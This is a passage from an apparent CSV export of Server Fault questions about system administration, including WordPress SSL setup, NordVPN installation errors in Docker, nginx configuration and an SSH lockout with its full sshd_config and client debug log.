<a href=""https://i.sstatic.net/UCiX9.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/UCiX9.png"" alt=""enter image description here""></a></li>
</ul>

<p><a href=""https://i.sstatic.net/Eil4C.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Eil4C.png"" alt=""enter image description here""></a></p>

<p><a href=""https://i.sstatic.net/Ncw3W.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Ncw3W.png"" alt=""enter image description here""></a></p>

<ul>
<li>Wordpress wp_config:</li>
</ul>

<p>define('WP_HOME','<a href=""https://instantaudiobook.co"" rel=""nofollow noreferrer"">https://instantaudiobook.co</a>');
define('WP_SITEURL','<a href=""https://instantaudiobook.co"" rel=""nofollow noreferrer"">https://instantaudiobook.co</a>');</p>
","<amazon-ec2><ssl-certificate><wordpress><amazon-route53><amazon-cloudfront>","2017-10-07 21:15:54"
"998245","Why do we need reverse proxy if we have load balancer?","<p>My main concern is since reverse proxy routing is static, how can it replace load balancer which routes the request dynamically upon checking the heath of the server? Then do we really need a reverse proxy?</p>
","<amazon-web-services><reverse-proxy><load-balancing>","2020-01-09 09:47:04"
"787915","How to change network config through command line?","<p>The system is <strong>Windows 8.1</strong> Professional.</p>

<p>I want to change through <code>command line</code> my network config to this one :</p>

<p><a href=""https://i.sstatic.net/D84vf.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/D84vf.jpg"" alt=""enter image description here""></a></p>

<p>How to do that ?</p>
","<command-line-interface><windows-command-prompt><windows-8.1>","2016-07-05 04:56:51"
"877492","Does ECC RAM help in a home-use NAS?","<p>Do i need to use ECC RAM if i'm only going to use a 100TB Server for video file storing, organizing and copying files on and off of it ? 
The build will be Asrock X370 Taichi + Ryzen 3 + Windows 10 Storage Spaces</p>
","<memory><network-attached-storage><ecc>","2017-10-08 19:07:48"
"877521","How do I create mail.example.com with postfix and dovecot?","<p>I currently have <code>postfix</code> and <code>dovecot</code> installed on my Ubuntu VPS. While I can log in via a mail client like <code>thunderbird</code> with the IP, it would be nice to have <code>mail.example.com</code>. I already own a domain with an MX record, so mail can be sent to my VPS, but how can I create the <code>mail</code> subdomain? I currently use cloudflare, so specific instructions for that would be appreciated. I'm good with Ubuntu and bash, but I suck at networking.</p>
","<ubuntu><domain-name-system><postfix><domain><dovecot>","2017-10-09 00:56:53"
"998338","Is someone trying to hack into my server?","<p>I don't do server stuffs on regular basis, I was just wondering how to check SSH login logs and found that it can be checked using <code>sudo cat /var/log/auth.log</code> and checked on my server and there were lots of <code>Failed password for root from [IP]</code> This is a newly installed remote server there's no way I could have logged so many times.</p>

<p>Then I read it carefully it says <code>Failed password for root from [IP]</code> I was like what? Its for <code>root</code>? I have created my separate user account and except the first time when I had to create a new user account I have never touch <code>root</code> user. It seems to me someone is trying his luck by bruteforcing for credentials. Still, I wanted to be sure so asking here.</p>
","<linux><ssh><security><logging><hacking>","2020-01-09 18:43:32"
"998391","How to run multiple copies of a program?","<p>I need to run a scientific program. One can usually only run one copy of it at any one time, it wont allow another copy to be open at the same time (somehow).</p>

<p>I would like to set up virtual servers or similar to run multiple instances of this resource intensive program and be able to seamlessly switch between these instances.</p>

<p>What would be the best way to do that? I would prefer to do this on a mac but linux or windows are options.</p>

<p>Thanks!</p>
","<virtualization><virtual-machines>","2020-01-10 04:31:12"
"998414","HP ProLiant ML110 G7 Difficulty Loading OpenSUSE Leap","<p>I am having a problem with the HP Proliant ML110 G7.  I am trying to load OPenSUSE Leap.  I go through the whole installation. It is supposed to detect and load all drivers required.  The ML100 G7 has a SmartRAID B110i controller card.  </p>

<p>32GB RAM
(4) disks (2) TB each</p>

<p>I loaded the OpenSUSE Leap from a CD.  I go through all the menus.  I have tried configuring the RAID 1+0 and designating the RAID configs and then I have tried loading the OpenSUSE Leap without doing the RAID set up only to get the same result that it would not boot from the Hard Drive and goes to GRUB recovery mode.</p>

<p>I have tried to disable the  SmartRAID B110i but then can't get anything to work properly.  I have tried several different ways to get it to work but nothing will work.  The RAID controller has a Logical Drive created but OpenSUSE does not see it and offers to create RAID drives.  I am not sure if I need to manually load the drivers but OpenSUSE is not giving me this option.  OpenSUSE is not giving me any warnings or saying that the ML 110 G7 is not compatable during the installation or giving me the opportunity to load HP ProLiant drivers.</p>

<p>Has anyone experienced this or has a procedure to get OpenSUSE to load would be great.  If I just disable the B110i RAID Controller and just use the virtual one create by OpenSUE?  </p>

<p>Just looking for solutions to get it to load and run.</p>

<p><a href=""https://i.sstatic.net/U7Fd7.jpg"" rel=""nofollow noreferrer"">Error msg</a>  </p>
","<hp-proliant><opensuse><raid10>","2020-01-10 10:00:29"
"998434","How is the port number known in Forward DNS lookup?","<p>Suppose, I type the website name www.yahoo.com in my browser. Forward DNS lookup will fetch us the IP address of the server but how does the client (browser) know the port number that the application is running on? </p>
","<domain-name-system>","2020-01-10 11:47:27"
"998479","Can a UEFI driver/service reserve a PCI device, preventing the OS from knowing about it and then use it after the OS boots","<p>Theoretically, if i was to have a extra network card in my computer would it be possible to create a UEFI driver/service which would prevent the about-to-boot operating system from knowing about the card (effectively reserving it), as well as start a service (eg. HTTP server) which would persist after the OS has booted?</p>
","<networking><tcp><uefi>","2020-01-10 16:08:00"
"998493","What company created IIS and or who did microsoft buy iis from","<p>Who did microsoft purchase IIS from?</p>

<p>I know the wiki says that they created it, but I am pretty sure they purchased it from another company.</p>
","<iis>","2020-01-10 18:12:08"
"877753","How to find ip pool of my isp?","<p>I could eventually get all ips my isp is using by restarting my router and writing down the ips I get but that's very time consuming, so is there any way to get ip pool of my isp?</p>
","<ip><isp><pool>","2017-10-10 10:50:42"
"788191","How to know where my site is hosted?","<p>Hii Experts I want to  know where my website <a href=""http://www.drpradeepjain.org"" rel=""nofollow noreferrer"">http://www.drpradeepjain.org</a> is 
hosted ? </p>

<p>Please Explain how to know and please explain where to host our website to get best results ....</p>
","<web-server><hosting><web-hosting><website><web>","2016-07-06 09:39:53"
"877819","Hosting a PHP application on Kubernetes (Google Container Engine)","<p>I need to host a PHP application on the Kubernetes infrastructure of Google Cloud Container Engine but I do not know how to procees, where to begin etc.</p>

<p>Basically the app was running on a VM with Apache and MongoDB. How can we make the same infrastructure but designed for Kubernetes and how to install it on GKE?</p>
","<apache-2.2><php><mongodb><google-cloud-platform><kubernetes>","2017-10-10 16:38:06"
"877841","How to measure bandwidth per cpu utilization","<p>I'm trying to measure efficiency of the networking system and looking for a tool that either allows to limit max bandwidth for each test or, ideally, limit cpu utilization. At the end I need to have an answer like ""for 10% CPU bandwidth is 10Gbit/s"".</p>

<p>Natural choice to test bandwidth alone would be the iperf tool, but it seems to always utilize 100% CPU making it useless for this.</p>
","<bandwidth><cpu-usage><load-testing><iperf><bandwidth-measuring>","2017-10-10 19:01:18"
"998608","docker | unknown environment `bash` | sub process /usr/bin/dpkg returned an error code(1)","<p>My goal is to get a docker container running with nordvpn installed and connected. </p>

<p><strong>Get docker container going</strong></p>

<pre><code>sudo docker pull ubuntu:latest
sudo docker run -it ubuntu bash
// now im in the docker container
apt install update
apt install wget
wget {{nordvpn_link.deb}}
dpkg -i {{nordvpn_link.deb}}
// some errors about dependencies after above command so ...
apt install -f
// then
apt install nordvpn
</code></pre>

<p><strong>First big error</strong></p>

<pre><code>root@f706a3f4012f:/home# apt install nordvpn
Reading package lists... Done
Building dependency tree       
Reading state information... Done
nordvpn is already the newest version (3.6.0-2).
0 upgraded, 0 newly installed, 0 to remove and 1 not upgraded.
1 not fully installed or removed.
After this operation, 0 B of additional disk space will be used.
Do you want to continue? [Y/n] 
Setting up nordvpn (3.6.0-2) ...
[ERROR] Unknown environment `bash'
dpkg: error processing package nordvpn (--configure):
installed nordvpn package post-installation script subprocess returned error exit status 255
Errors were encountered while processing:
nordvpn
E: Sub-process /usr/bin/dpkg returned an error code (1)
</code></pre>

<p><strong>I read <a href=""https://itsfoss.com/dpkg-returned-an-error-code-1/"" rel=""nofollow noreferrer"">here</a> to run the following command</strong></p>

<pre><code>dpkg --configure -a
// errors
Setting up nordvpn (3.6.0-2) ...
[ERROR] Unknown environment `bash'
dpkg: error processing package nordvpn (--configure):
installed nordvpn package post-installation script subprocess returned error exit status 255
Errors were encountered while processing:
nordvpn
</code></pre>

<p>I am not sure as to why this is happening with the docker container as the process went smoothly on my regular ubuntu desktop installation.</p>
","<linux><ubuntu><docker><containers><dpkg>","2020-01-12 04:39:54"
"877870","Dell R910 Motherboard","<p>Can i cut this handle with a small saw?
This is blocking my Zotac GPU.</p>

<p><a href=""https://i.sstatic.net/aVBqG.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/aVBqG.png"" alt=""Dell R910 Motherboard""></a></p>
","<dell-poweredge>","2017-10-11 00:00:08"
"998641","What SAS adapter is compatible with Supermicro X9DRD-iF motherboard?","<p>Here is my motherboard <a href=""https://www.supermicro.com/products/motherboard/Xeon/C600/X9DRD-iF.cfm"" rel=""nofollow noreferrer"">https://www.supermicro.com/products/motherboard/Xeon/C600/X9DRD-iF.cfm</a></p>

<p>I need a compatible adapter so I can connect 2 SAS drives to this motherboard as it does not have native compatibility. Apparently Supermicro makes their own adapters, but I could not find adapters for X9.. but only for X10.. and X11.. motherboards <a href=""https://www.supermicro.com/en/products/storage/cards"" rel=""nofollow noreferrer"">https://www.supermicro.com/en/products/storage/cards</a></p>

<p>What SAS adapter is compatible with Supermicro X9DRD-iF motherboard?</p>
","<sas><supermicro><adapter>","2020-01-12 19:42:16"
"788639","Router can connect to internet but clients intermittently can't get beyond the router","<p>Currently working with a small business which is using an ISP supplied domestic ADSL modem/router to connect their internal setup to the internet and this is also being used for DHCP.</p>

<p>They're having repeated problems where 1 or more clients lose internet connectivity.  During these times all clients/servers can connect internally without issue, all clients and servers can ping the modem/router but can't connect out over any protocol (web, email or ping).</p>

<p>Unfortunately this domestic modem/router doesn't have much of an interface but during these episodes I can ping to a public IP from the router web console.</p>

<p>The customer had been restarting everything every time to resolve but the issue is actually resolved by performing a DHCP renew on the affected device.</p>

<p>In summary during the fault time all 192.168.1.0/24 hosts can connect with each other and to the gateway (192.168.1.1). That gateway can connect to the internet but the hosts can't.</p>

<p>I suspect that this is related to DHCP lease expiry but wouldn't that stop internal network traffic too?</p>

<p>How can I get my customer back online reliably?</p>

<p>(I'd love to recommend that they invest in some proper business grade tech but they don't have the budget so I am left to try and resolve with what they have.)</p>
","<networking><dhcp>","2016-07-08 08:23:28"
"788663","How to dump VXLAN/VLAN ID in packet capture?","<p>Is there anyway to use tcpdump or any other linux tool to know VXLAN ID/VLAN ID while capturing packet on interfaces? </p>
","<linux><tcpdump><tshark>","2016-07-08 10:59:45"
"788671","Does it involve network to copy a file within a NFS share?","<p>I am assuming the following ways to copy a file with in a NFS share:</p>

<p><strong>Process 1:</strong></p>

<ul>
<li>The client requests for the data to be copied from NFS share (if cache is not there) and the chunks of data are asynchronously copied to memory of the NFS client which then asynchronously send it to the NFS filer again to copy to new location.</li>
<li>The NFS filer receives the chunks of data asynchronously in the memory and writes it to the new location.</li>
<li>In this process, though there is network involved while reading and also writing, due to asynchronous read &amp; write, the latency for one overall read-write operation will be same as latency for read-write operation of overall data. </li>
</ul>

<p>Hence, reading from local hard disk and writing to NFS is almost same as reading from NFS and write to NFS.</p>

<p>In the first step, if cache is already there, the reading can be very quick.</p>

<p><strong>Process 2:</strong></p>

<ul>
<li>The client send request to initiate the data copy operation to NFS server, along with the location from where it has to read and where it has to write (seems it is not).</li>
<li>The server does the rest, read-write operations using it's own memory.</li>
</ul>

<p>Hence, no network involved. And hence, can have better performance (unless there is no latency at the network end) But it is likely not the way.</p>

<p>Please correct me at every point, if I am wrong. </p>

<p>Also, does the memory involves at every operation, I mean when it sends data across network, the data is first sent to memory (data buffer) from disk and then from memory (data buffer) to data buffer (on the other side of the network), but not from data buffer to disk on the other side of the network right?</p>
","<performance><memory><nfs><dd><transfer>","2016-07-08 12:11:23"
"788738","Is VPS and VM same thing or is there any difference?","<p>It appears to me that VPS and VM is the same thing because of the way they both work. But if we dig little deeper, is there any noticeable difference between the two like physical hardware, management or scalability? Can anyone provide difference and similarities between the both? Or VM is just a new-age name for old VPS?</p>

<p>TIA</p>
","<virtual-machines><vps>","2016-07-08 17:54:29"
"998771","Is there an additional cost to write metadata to objects in the bucket?","<p>I was looking into writing an MD5sum to the object after it has been uploaded to AWS S3 and doing a data integrity check as described here:</p>

<p><a href=""https://aws.amazon.com/premiumsupport/knowledge-center/data-integrity-s3/"" rel=""nofollow noreferrer"">https://aws.amazon.com/premiumsupport/knowledge-center/data-integrity-s3/</a></p>

<p>For example, you uploaded 100,000 objects to an AWS S3 bucket and you want to run the MD5 to do an data integrity check, is there an additional cost for doing this? Does it add to the count of requests for a PUT, LIST, etc?</p>
","<amazon-web-services><amazon-s3><aws-cli>","2020-01-13 20:41:02"
"998801","secondary fqdn for certificate authority","<p>I have a CA that is serving computer clients successfully and NPS (Etc.) is all fine. We are currently looking to move some services outside of the network perimeter and I would like to create a secondary cert for <strong>users</strong> rather than computers. One key shouldn't open all the doors, I know there's priv keys on personal devices for ""special"" staff etc.</p>

<p>fqdn ->
*.services.fqdn</p>

<p>Some questions:</p>

<ul>
<li>How do I create a subdomain for the same forest?</li>
<li>The external radius server is not connected to our domain (ie uploaded the public cert and point it towards the crl)

<ul>
<li>Will the computer cert be able to authenticate against the subordinate cert?</li>
</ul></li>
<li>If anybody has done something like this before am I better off creating a *.client.fqdn and a *.services.fqdn </li>
<li>Can I still have SCEP for the FQDN cert?</li>
</ul>

<p>Thanks</p>
","<windows-server-2012-r2><certificate-authority>","2020-01-13 23:48:56"
"878070","Reduce latency between USA users from EU server","<p>I'm in a pickle. I had thought my server was in Canada, but turns out it is in France. I don't have the time for a server migration right now (it's the end goal as 75% if the visitors are USA).</p>

<p>Using the website speed test on pingdom, the first byte wait is around 140ms when I test it from Sweden. When I test from California it's around 680ms. I need to try and reduce this as Google say it is slow to crawl the site and overall most visitors are from the US so I need to improve their experience. </p>

<p>Cloudflare is caching static assets so while the latency is also in the 600+ region for css, js and images, they fall right down once Cloudflare picks the files up. My focus is now in php files. </p>

<p>I am unable to use nginx as I cannot do a 100% html cache via a proxy. I can however use redis to cache 99% of the HTML. I have upgraded to php7 and Apache now works with it via fast CGI. I have made the site as quick as I possibly can with heavy memory caching and getting rid of all unused modules etc. This site is quite quick with tests from pingdom in California taking 2-3 seconds to fully render a page that does not hit the HTML cache. However if I can get rid of some of that 600ms delay I would be breezing. </p>

<p>Outside of owning a server in EU and USA and using a load balancer, what can I do to speed up the experience for US users and get rid of some of that lstency?</p>

<p>I am running Centos 7 with Apache 2.4 and php7 (fast CGI) over a 100mb connection on server in France. The server is dedicated with 16gb ram and a 4 core xeon with 8 threads @2.4ghz. </p>
","<web-server><performance><latency>","2017-10-12 06:27:53"
"878087","Executing image file on a shared folder fails but opening from explorer works","<p>On a computer with Windows 7 (virtualized PC on a server) I have a shared folder</p>

<pre><code>\\czek000lbsv015\CHO\
</code></pre>

<p>Security is set to
<code>Authenticated Users</code> can <code>Read and execute</code>, <code>View folder content</code>, <code>Read</code>.</p>

<p>Sharing is set to <code>Read</code> &amp; <code>Change</code> for the domain user in question.</p>

<p>I have a problem when I try to run an image file by entering its UNC path to Run dialog, or doubleclicking the UNC link in Outlook or running C# <code>Process.Start(""\\czek000lbsv015\CHO\20171010153330_1BB5442.jpg"")</code>.</p>

<pre><code>\\czek000lbsv015\CHO\20171010153330_1BB5442.jpg               
</code></pre>

<p>it shows</p>

<blockquote>
  <p>windows photo viewer can't open this picture because either the
  picture is deleted, or it's in a location</p>
</blockquote>

<p>But the file in a subfolder opens well when executed:</p>

<pre><code>\\czek000lbsv015\CHO\THUMB\20171010153330_1BB5442.jpg               
</code></pre>

<p>When I click on either of the files in Explorer then both open well, I can browse the folder etc.</p>

<p>What is wrong, how to fix it? I need to open the file from a C# program.</p>
","<windows><windows-7><network-share>","2017-10-12 08:19:20"
"788842","nginx: configuration file test failed","<p>I using DirectAdmin and Nginx installed,
i have huge clients at the moment and i see ""Nginx 503 Error"" sometimes,
and i have 3Gb ram with 790 used ram...</p>

<p>And now i want increase Worker Connections, but in this File i have no this item:</p>

<pre><code>nano /etc/nginx/nginx.conf
</code></pre>

<p>and when i add this item manually, i see below error after Nginx restart:</p>

<pre><code>[root@server ~]# service nginx restart
nginx: [emerg] ""worker_connections"" directive is duplicate in /etc/nginx/nginx-events.conf:1
nginx: configuration file /etc/nginx/nginx.conf test failed
</code></pre>

<p>also when i increase ""worker_processes  1;"" to 5, after restart nginx it see still 1 with below output: </p>

<pre><code>[root@server ~]# grep processor /proc/cpuinfo | wc -l
1
</code></pre>

<p>below is my output of configuration file:</p>

<pre><code>#user  nginx;

# The number of worker processes is changed automatically by CustomBuild, according to the number of CPU cores, if it's set to ""1""
worker_processes  100;

pid /var/run/nginx.pid;

#error_log  logs/error.log;
#error_log  logs/error.log  notice;
#error_log  logs/error.log  info;

events {
#    worker_connections 1024;
    include /etc/nginx/nginx-events.conf;
}


http {
    include       /etc/nginx/mime.types;

    # For user configurations not maintained by DirectAdmin. Empty by default.
    include /etc/nginx/nginx-includes.conf;

    # Supplemental configuration
    include /etc/nginx/nginx-modsecurity-enable.conf;
    include /etc/nginx/nginx-defaults.conf;
    include /etc/nginx/nginx-gzip.conf;
    include /etc/nginx/directadmin-ips.conf;
    include /etc/nginx/directadmin-settings.conf;
    include /etc/nginx/nginx-vhosts.conf;
    include /etc/nginx/directadmin-vhosts.conf;
}
</code></pre>
","<nginx><optimization>","2016-07-09 06:42:27"
"788853","ssh login not possible, how to add new user without terminal?","<p>I have messed around big time and now I find myself unable to ssh login via putty/terminal anymore.</p>

<p>I am able to login to Parallels Power Panel (<a href=""https://XXXX:4643"" rel=""nofollow noreferrer"">https://XXXX:4643</a>) with my root login.
I would like to be able to login via SSH again.</p>

<p>This is my sshd_conf:</p>

<pre><code># Package generated configuration file
# See the sshd_config(5) manpage for details

# What ports, IPs and protocols we listen for
Port 22
# Use these options to restrict which interfaces/protocols sshd will bind to
#ListenAddress ::
#ListenAddress 0.0.0.0
Protocol 2
# HostKeys for protocol version 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_dsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
#Privilege Separation is turned on for security
UsePrivilegeSeparation yes

# Lifetime and size of ephemeral version 1 server key
KeyRegenerationInterval 3600
ServerKeyBits 1024

# Logging
SyslogFacility AUTH
LogLevel INFO

# Authentication:
LoginGraceTime 120
PermitRootLogin yes
StrictModes yes

RSAAuthentication yes
PubkeyAuthentication yes
#AuthorizedKeysFile %h/.ssh/authorized_keys

# Don't read the user's ~/.rhosts and ~/.shosts files
IgnoreRhosts yes
# For this to work you will also need host keys in /etc/ssh_known_hosts
RhostsRSAAuthentication no
# similar for protocol version 2
HostbasedAuthentication no
# Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication
#IgnoreUserKnownHosts yes

# To enable empty passwords, change to yes (NOT RECOMMENDED)
PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Change to no to disable tunnelled clear text passwords
#PasswordAuthentication yes

# Kerberos options
#KerberosAuthentication no
#KerberosGetAFSToken no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes

X11Forwarding yes
X11DisplayOffset 10
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
#UseLogin no

#MaxStartups 10:30:60
#Banner /etc/issue.net

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

Subsystem sftp /usr/lib/openssh/sftp-server

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of ""PermitRootLogin without-password"".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes
</code></pre>

<p>This is what I get when I try to login via ssh </p>

<pre><code>    OpenSSH_6.9p1, LibreSSL 2.1.8
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug2: ssh_connect: needpriv 0
debug1: Connecting to XXXXXXX.XX [xxx.xxx.xx.xxx] port 22.
debug1: Connection established.
debug1: key_load_public: No such file or directory
debug1: identity file /Users/XXX/.ssh/id_rsa type -1
debug1: key_load_public: No such file or directory
debug1: identity file /Users/XXX/.ssh/id_rsa-cert type -1
debug1: key_load_public: No such file or directory
debug1: identity file /Users/XXX/.ssh/id_dsa type -1
debug1: key_load_public: No such file or directory
debug1: identity file /Users/XXX/.ssh/id_dsa-cert type -1
debug1: key_load_public: No such file or directory
debug1: identity file /Users/XXX/.ssh/id_ecdsa type -1
debug1: key_load_public: No such file or directory
debug1: identity file /Users/XXX/.ssh/id_ecdsa-cert type -1
debug1: key_load_public: No such file or directory
debug1: identity file /Users/XXX/.ssh/id_ed25519 type -1
debug1: key_load_public: No such file or directory
debug1: identity file /Users/XXX/.ssh/id_ed25519-cert type -1
debug1: Enabling compatibility mode for protocol 2.0
debug1: Local version string SSH-2.0-OpenSSH_6.9
debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.7
debug1: match: OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.7 pat OpenSSH_6.6.1* compat 0x04000000
debug2: fd 3 setting O_NONBLOCK
debug1: Authenticating to vXXXXXXX:22 as 'root'
debug3: hostkeys_foreach: reading file ""/Users/XXX/.ssh/known_hosts""
debug3: record_hostkey: found key type ECDSA in file /Users/XXX/.ssh/known_hosts:1
debug3: load_hostkeys: loaded 1 keys from XXXXXXX.XX
debug3: order_hostkeyalgs: prefer hostkeyalgs: ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug2: kex_parse_kexinit: curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
debug2: kex_parse_kexinit: ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,ssh-dss-cert-v01@openssh.com,ssh-rsa-cert-v00@openssh.com,ssh-dss-cert-v00@openssh.com,ssh-ed25519,ssh-rsa,ssh-dss
debug2: kex_parse_kexinit: chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se
debug2: kex_parse_kexinit: chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se
debug2: kex_parse_kexinit: umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-md5-etm@openssh.com,hmac-ripemd160-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-md5,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96
debug2: kex_parse_kexinit: umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-md5-etm@openssh.com,hmac-ripemd160-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-md5,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96
debug2: kex_parse_kexinit: none,zlib@openssh.com,zlib
debug2: kex_parse_kexinit: none,zlib@openssh.com,zlib
debug2: kex_parse_kexinit: 
debug2: kex_parse_kexinit: 
debug2: kex_parse_kexinit: first_kex_follows 0 
debug2: kex_parse_kexinit: reserved 0 
debug2: kex_parse_kexinit: curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
debug2: kex_parse_kexinit: ssh-rsa,ssh-dss,ecdsa-sha2-nistp256,ssh-ed25519
debug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se
debug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se
debug2: kex_parse_kexinit: hmac-md5-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-ripemd160-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-md5,hmac-sha1,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96
debug2: kex_parse_kexinit: hmac-md5-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-ripemd160-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-md5,hmac-sha1,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96
debug2: kex_parse_kexinit: none,zlib@openssh.com
debug2: kex_parse_kexinit: none,zlib@openssh.com
debug2: kex_parse_kexinit: 
debug2: kex_parse_kexinit: 
debug2: kex_parse_kexinit: first_kex_follows 0 
debug2: kex_parse_kexinit: reserved 0 
debug1: kex: server-&gt;client chacha20-poly1305@openssh.com &lt;implicit&gt; none
debug1: kex: client-&gt;server chacha20-poly1305@openssh.com &lt;implicit&gt; none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:NMkvwlZ/A62s+w4guGr4h/dkRcs0Vy6ExS0KHswvgPI
debug3: hostkeys_foreach: reading file ""/Users/XXX/.ssh/known_hosts""
debug3: record_hostkey: found key type ECDSA in file /Users/XXX/.ssh/known_hosts:1
debug3: load_hostkeys: loaded 1 keys from XXXXXXX.XX
debug3: hostkeys_foreach: reading file ""/Users/XXX/.ssh/known_hosts""
debug3: record_hostkey: found key type ECDSA in file /Users/XXX/.ssh/known_hosts:1
debug3: load_hostkeys: loaded 1 keys from xxx.xxx.xx.xxx
debug1: Host 'XXXXXXX.XX' is known and matches the ECDSA host key.
debug1: Found key in /Users/XXX/.ssh/known_hosts:1
debug2: set_newkeys: mode 1
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug2: set_newkeys: mode 0
debug1: SSH2_MSG_NEWKEYS received
debug1: SSH2_MSG_SERVICE_REQUEST sent
debug2: service_accept: ssh-userauth
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug2: key: /Users/XXX/.ssh/id_rsa (0x0),
debug2: key: /Users/XXX/.ssh/id_dsa (0x0),
debug2: key: /Users/XXX/.ssh/id_ecdsa (0x0),
debug2: key: /Users/XXX/.ssh/id_ed25519 (0x0),
debug1: Authentications that can continue: publickey,password
debug3: start over, passed a different list publickey,password
debug3: preferred publickey,keyboard-interactive,password
debug3: authmethod_lookup publickey
debug3: remaining preferred: keyboard-interactive,password
debug3: authmethod_is_enabled publickey
debug1: Next authentication method: publickey
debug1: Trying private key: /Users/XXX/.ssh/id_rsa
debug3: no such identity: /Users/XXX/.ssh/id_rsa: No such file or directory
debug1: Trying private key: /Users/XXX/.ssh/id_dsa
debug3: no such identity: /Users/XXX/.ssh/id_dsa: No such file or directory
debug1: Trying private key: /Users/XXX/.ssh/id_ecdsa
